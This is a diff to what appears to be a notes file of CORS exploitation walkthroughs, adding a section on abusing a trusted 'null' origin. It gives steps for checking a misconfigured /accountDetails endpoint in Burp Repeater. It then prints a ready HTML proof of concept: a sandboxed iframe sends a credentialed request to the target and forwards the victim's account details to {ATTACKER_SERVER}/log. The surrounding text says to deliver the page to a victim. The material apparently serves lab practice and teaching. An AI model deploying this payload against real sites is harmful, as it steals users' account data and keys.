@@ -23,6 +23,21 @@ cors.html
     };
 </script>
 ```
-Above PoC you need to deliver to victim, once victim clicks on opens the PoC then his account specific details would come in attacker's logs. Dont forget to change HOSTNAME and endpoint value. In our case ENDPOINT should be accountDetails.
-
-
+Above PoC you need to deliver to victim, once victim clicks on opens the PoC then his account specific details would come in attacker's logs. Dont forget to change HOSTNAME and endpoint value. In our case ENDPOINT should be /accountDetails.
+### CORS vulnerability with trusted null origin
+* Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
+* Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
+* Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.
+HTML poc:
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://{HOSTNAME}/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://{ATTACKER_SERVER}/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
+```
